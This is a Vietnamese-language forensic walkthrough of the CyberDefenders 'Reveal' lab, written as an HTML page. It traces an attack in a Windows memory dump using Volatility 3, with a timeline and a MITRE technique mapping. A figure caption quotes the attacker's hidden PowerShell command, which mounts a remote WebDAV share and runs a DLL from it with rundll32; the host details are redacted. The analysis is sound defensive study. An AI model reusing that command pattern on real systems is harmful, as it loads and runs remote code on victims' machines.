@@ -1,0 +1,130 @@
+<!doctype html>
+<html lang="vi" translate="no" class="notranslate">
+<head>
+<meta charset="utf-8">
+<meta name="google" content="notranslate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self' 'sha256-K65AckC8Kni8xRtJL2GTaDpcWiXKw4p6QJiEl43/uPI='; img-src 'self' https://avatars.githubusercontent.com; script-src 'self'; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="no-referrer">
+<style>html:not(.pv) body>*:not(noscript),html.dt body>*{display:none!important}html.dt body::before{content:"Đóng DevTools hoặc tải lại trang để xem nội dung.";display:block;padding:48px 16px;text-align:center;font:18px/1.5 system-ui,sans-serif}</style>
+<title>Reveal lab - CyberDefenders writeup tiếng Việt | Chiendn2k1</title>
+<meta name="description" content="CyberDefenders Reveal writeup (walkthrough tiếng Việt): Dựng lại chuỗi tấn công từ memory dump Windows bằng Volatility 3: PowerShell chạy ẩn, kết nối share WebDAV và chạy DLL bằng rundll32 trực tiếp từ máy ở xa.">
+<meta name="author" content="Chiendn2k1">
+<link rel="canonical" href="https://chiendn2k1-ahahaha.github.io/cyberdefenders-writeups/labs/reveal.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="CyberDefenders writeups">
+<meta property="og:title" content="Reveal lab - CyberDefenders writeup tiếng Việt | Chiendn2k1">
+<meta property="og:description" content="CyberDefenders Reveal writeup (walkthrough tiếng Việt): Dựng lại chuỗi tấn công từ memory dump Windows bằng Volatility 3: PowerShell chạy ẩn, kết nối share WebDAV và chạy DLL bằng rundll32 trực tiếp từ máy ở xa.">
+<meta property="og:url" content="https://chiendn2k1-ahahaha.github.io/cyberdefenders-writeups/labs/reveal.html">
+<meta property="og:locale" content="vi_VN">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Reveal - CyberDefenders writeup", "description": "Dựng lại chuỗi tấn công từ memory dump Windows bằng Volatility 3: PowerShell chạy ẩn, kết nối share WebDAV và chạy DLL bằng rundll32 trực tiếp từ máy ở xa.", "inLanguage": "vi", "url": "https://chiendn2k1-ahahaha.github.io/cyberdefenders-writeups/labs/reveal.html", "dateModified": "2026-11-04", "author": {"@type": "Person", "name": "Chiendn2k1", "url": "https://cyberdefenders.org/p/Chiendn2k1/"}, "keywords": "CyberDefenders, Reveal, writeup, walkthrough, Endpoint Forensics, Volatility 3, Stealth", "about": {"@type": "Thing", "name": "CyberDefenders Reveal lab", "url": "https://cyberdefenders.org/blueteam-ctf-challenges/reveal/"}}</script>
+<link rel="icon" href="../favicon.ico" sizes="any">
+<link rel="icon" type="image/png" href="../assets/favicon-32.png">
+<link rel="apple-touch-icon" href="../assets/apple-touch-icon.png">
+<link rel="stylesheet" href="../style.css?v=c0502c0f">
+<script src="../protect.js?v=2d57047c"></script>
+</head>
+<body>
+<noscript>Trang cần bật JavaScript để hiển thị nội dung.</noscript>
+<header class="top"><a class="brand" href="../">CyberDefenders writeups</a>
+<nav class="me">
+<a href="https://www.linkedin.com/in/chiendn/" rel="noopener noreferrer" target="_blank">LinkedIn</a>
+<a href="https://github.com/chiendn2k1-ahahaha" rel="noopener noreferrer" target="_blank">GitHub</a>
+<a href="https://cyberdefenders.org/blueteam-ctf-challenges/leaderboard/" rel="noopener noreferrer" target="_blank">Bảng xếp hạng</a>
+<a class="ava" href="https://cyberdefenders.org/p/Chiendn2k1/" rel="noopener noreferrer" target="_blank" title="Chiendn2k1 trên CyberDefenders"><img src="https://avatars.githubusercontent.com/u/352285299?s=80" alt="Avatar Chiendn2k1" width="36" height="36"></a>
+</nav></header>
+<main class="page">
+<nav class="toc"><b>Mục lục</b><ul><li><a href="#tom-tat-ket-qua">Tóm tắt kết quả</a></li><li><a href="#buoc-1-tim-tien-trinh-bat-thuong">Bước 1: tìm tiến trình bất thường</a></li><li><a href="#buoc-2-xac-inh-nguoi-dung-chay-tien-trinh">Bước 2: xác định người dùng chạy tiến trình</a></li><li><a href="#buoc-3-tai-payload-qua-webdav">Bước 3: tải payload qua WebDAV</a></li><li><a href="#buoc-4-chay-dll-qua-binary-he-thong">Bước 4: chạy DLL qua binary hệ thống</a></li><li><a href="#buoc-5-vung-nho-thuc-thi-va-ho-ma-oc">Bước 5: vùng nhớ thực thi và họ mã độc</a></li><li><a href="#dong-thoi-gian">Dòng thời gian</a></li></ul></nav>
+<article>
+<h1 id="reveal">Reveal</h1>
+<ul>
+<li><strong>Lab:</strong> <a href="https://cyberdefenders.org/blueteam-ctf-challenges/reveal/">Reveal</a> trên CyberDefenders. Nhóm Endpoint Forensics, độ khó Easy, đã retired.</li>
+<li><strong>Dữ liệu:</strong> <code>192-Reveal.dmp</code>, memory dump (ảnh bộ nhớ RAM) 2 GB của một máy trạm Windows.</li>
+<li><strong>Công cụ:</strong> Volatility 3 (2.28.2), plugin <code>windows.pstree</code> (cây tiến trình cha con), <code>windows.getsids</code> (tài khoản và nhóm của tiến trình), <code>windows.malware.malfind</code> (vùng nhớ thực thi không gắn file).</li>
+<li><strong>Quy ước:</strong></li>
+<li>Ảnh là ảnh chụp cửa sổ PowerShell chạy Volatility trên memory dump của lab.</li>
+<li><span class="red">Khung đỏ</span> đánh dấu chỗ cần chú ý. Vùng làm mờ là đáp án (PID cha, tên người dùng, IP, tên share, tên DLL).</li>
+</ul>
+<h2 id="tom-tat-ket-qua">Tóm tắt kết quả</h2>
+<ul>
+<li>Lúc 07:00:03 UTC ngày 15/07/2024, một tiến trình cha (không còn trong bộ nhớ) sinh ra cùng lúc <code>wordpad.exe</code> và <code>powershell.exe</code> chạy ẩn (<code>-windowstyle hidden</code>).</li>
+<li>PowerShell kết nối một share WebDAV trên một IP public qua cổng 8888 (<code>net use</code>), rồi gọi <code>rundll32</code> chạy hàm <code>entry</code> của một DLL tên dạng số, đặt ngay trên share đó.</li>
+<li>Tiến trình chạy dưới tài khoản local <code>S-1-5-21-...-1001</code>, thuộc nhóm Administrators.</li>
+<li><code>windows.malware.malfind</code> thấy 5 vùng nhớ <code>PAGE_EXECUTE_READWRITE</code> riêng trong <code>powershell.exe</code>. Dấu hiệu này chưa đủ để kết luận có chèn mã, vì PowerShell (.NET) vẫn tạo vùng nhớ loại này khi biên dịch JIT.</li>
+</ul>
+<h2 id="buoc-1-tim-tien-trinh-bat-thuong">Bước 1: tìm tiến trình bất thường</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> tìm tiến trình độc đầu tiên và tiến trình cha của nó.</li>
+<li><strong>Cách làm:</strong> chạy <code>windows.pstree</code>, lọc các dòng của tiến trình đáng ngờ và tiến trình cha.</li>
+</ul>
+<pre><code class="language-bash">vol -f 192-Reveal.dmp windows.pstree | Select-String 'PPID|\s&lt;PPID&gt;\s|\s3692\s'
+</code></pre>
+<figure><img src="../img/reveal/rv-01-pstree.png" alt="Volatility windows.pstree: wordpad.exe, powershell.exe, net.exe"><figcaption>windows.pstree. wordpad.exe (PID 9112) và powershell.exe (PID 3692) có cùng PPID (đã làm mờ), cùng được tạo lúc 2024-07-15 07:00:03 UTC. Command line của PowerShell: -windowstyle hidden net use \\&lt;IP&gt;@8888\&lt;share&gt;\ ; rundll32 \\&lt;IP&gt;@8888\&lt;share&gt;\&lt;tên&gt;.dll,entry (IP, tên share, tên DLL đã làm mờ). PowerShell sinh net.exe (PID 2416) lúc 07:00:06 UTC.</figcaption></figure>
+
+<ul>
+<li><strong>Nhận định:</strong></li>
+<li>PowerShell chạy ẩn cửa sổ và tải mã từ máy ở xa là hành vi bất thường với một máy trạm.</li>
+<li>Tiến trình cha không còn trong danh sách tiến trình, tức đã thoát trước lúc chụp memory. Nó sinh ra <code>wordpad.exe</code> và <code>powershell.exe</code> trong cùng một giây.</li>
+<li>Chưa đủ dữ liệu để biết tiến trình cha là gì: <code>windows.pstree</code> không còn bản ghi của PID đó. Cần thêm event log (Sysmon tạo tiến trình) hoặc Prefetch của máy.</li>
+<li>Hướng giải: tên tiến trình độc và PPID (ô đã làm mờ) đọc trực tiếp ở dòng PID 3692.</li>
+</ul>
+<h2 id="buoc-2-xac-inh-nguoi-dung-chay-tien-trinh">Bước 2: xác định người dùng chạy tiến trình</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> biết tài khoản nào đã chạy PowerShell.</li>
+<li><strong>Cách làm:</strong> chạy <code>windows.getsids</code> cho PID 3692.</li>
+</ul>
+<pre><code class="language-bash">vol -f 192-Reveal.dmp windows.getsids --pid 3692
+</code></pre>
+<figure><img src="../img/reveal/rv-02-getsids.png" alt="Volatility windows.getsids cho PID 3692"><figcaption>windows.getsids của powershell.exe. SID kết thúc bằng -1001 là tài khoản người dùng (tên đã làm mờ). Tiến trình có thêm SID S-1-5-114 "Local Account (Member of Administrators)" và S-1-5-32-544 "Administrators".</figcaption></figure>
+
+<ul>
+<li><strong>Nhận định:</strong></li>
+<li>RID 1001 là tài khoản local đầu tiên được tạo trên máy. SID <code>S-1-5-114</code> xác nhận đây là tài khoản local, không phải tài khoản domain.</li>
+<li>Tài khoản có quyền quản trị máy, nên mã độc chạy dưới tài khoản này có toàn quyền trên máy.</li>
+<li>Hướng giải: tên người dùng là ô đã làm mờ ở dòng SID <code>-1001</code>.</li>
+</ul>
+<h2 id="buoc-3-tai-payload-qua-webdav">Bước 3: tải payload qua WebDAV</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> xác định file tầng hai và nơi nó được lấy về.</li>
+<li><strong>Cách làm:</strong> đọc command line của PID 3692 và PID 2416 ở Bước 1.</li>
+<li><strong>Nhận định:</strong></li>
+<li>Cú pháp <code>\\&lt;IP&gt;@8888\&lt;share&gt;\</code> là đường dẫn UNC tới WebDAV (giao thức chia sẻ file qua HTTP) trên cổng 8888. Windows dịch đường dẫn này thành request HTTP tới máy ở xa.</li>
+<li><code>net use</code> gắn share trước, sau đó <code>rundll32</code> nạp DLL trực tiếp từ share. DLL không cần chép về ổ đĩa cục bộ.</li>
+<li>Hướng giải: tên share và tên DLL nằm trong đường dẫn UNC của command line.</li>
+</ul>
+<h2 id="buoc-4-chay-dll-qua-binary-he-thong">Bước 4: chạy DLL qua binary hệ thống</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> xác định cách DLL được chạy và kỹ thuật MITRE ATT&amp;CK tương ứng.</li>
+<li><strong>Cách làm:</strong> đọc phần sau dấu <code>;</code> trong command line của PID 3692.</li>
+<li><strong>Nhận định:</strong></li>
+<li>DLL được truyền cho <code>rundll32</code> kèm tên hàm export <code>entry</code>. <code>rundll32.exe</code> là binary có chữ ký của Microsoft trong <code>C:\Windows\System32</code>.</li>
+<li>Chạy DLL qua binary hệ thống giúp né các luật chặn dựa trên đường dẫn hay phần mở rộng file.</li>
+<li>Hướng giải: mã kỹ thuật là sub-technique của System Binary Proxy Execution (T1218) dành cho <code>rundll32</code>.</li>
+</ul>
+<h2 id="buoc-5-vung-nho-thuc-thi-va-ho-ma-oc">Bước 5: vùng nhớ thực thi và họ mã độc</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> kiểm tra dấu hiệu mã chạy trong bộ nhớ và gọi tên họ mã độc.</li>
+<li><strong>Cách làm:</strong> chạy <code>windows.malware.malfind</code> cho PID 3692.</li>
+</ul>
+<pre><code class="language-bash">vol -f 192-Reveal.dmp windows.malware.malfind --pid 3692
+</code></pre>
+<figure><img src="../img/reveal/rv-03-malfind.png" alt="Volatility malfind cho PID 3692"><figcaption>windows.malware.malfind trên powershell.exe: 5 vùng nhớ VadS (private) có quyền PAGE_EXECUTE_READWRITE, không gắn với file trên đĩa.</figcaption></figure>
+
+<ul>
+<li><strong>Nhận định:</strong></li>
+<li>Vùng nhớ vừa ghi vừa thực thi là nơi mã độc hay dùng để chạy shellcode. Tuy vậy PowerShell (.NET) cũng tạo vùng nhớ loại này khi biên dịch JIT, nên kết quả malfind ở đây chưa đủ để kết luận có chèn mã. Cần dump các vùng này (<code>--dump</code>) và kiểm tra nội dung (có header PE hay shellcode).</li>
+<li>Họ mã độc được xác định qua threat intel. Chuỗi tấn công gồm PowerShell ẩn, <code>net use</code> tới WebDAV <code>@8888</code> và <code>rundll32 &lt;số&gt;.dll,entry</code> là mẫu phát tán đã được nhiều báo cáo công khai mô tả cho một họ stealer chuyên lấy thông tin đăng nhập email.</li>
+<li>Chưa đủ dữ liệu để biết thông tin đã bị gửi đi đâu, vì lab không có packet capture hay log firewall.</li>
+<li>Hướng giải: tra IP hoặc tên share WebDAV trên các nền tảng threat intel công khai để lấy tên họ mã độc.</li>
+</ul>
+<h2 id="dong-thoi-gian">Dòng thời gian</h2>
+<ul>
+<li>15/07/2024 07:00:03 UTC (14:00:03 UTC+7): tiến trình cha sinh <code>wordpad.exe</code> và <code>powershell.exe -windowstyle hidden</code>. Nguồn: <code>windows.pstree</code>.</li>
+<li>15/07/2024 07:00:06 UTC (14:00:06 UTC+7): PowerShell sinh <code>net.exe use \\&lt;IP&gt;@8888\&lt;share&gt;\</code>. Nguồn: <code>windows.pstree</code>.</li>
+<li>Sau đó: <code>rundll32</code> chạy hàm <code>entry</code> của DLL trên share WebDAV. Tiến trình <code>rundll32</code> không còn trong bộ nhớ lúc chụp. Nguồn: command line của PID 3692.</li>
+</ul>
+</article>
+</main>
+
+</body>
+</html>
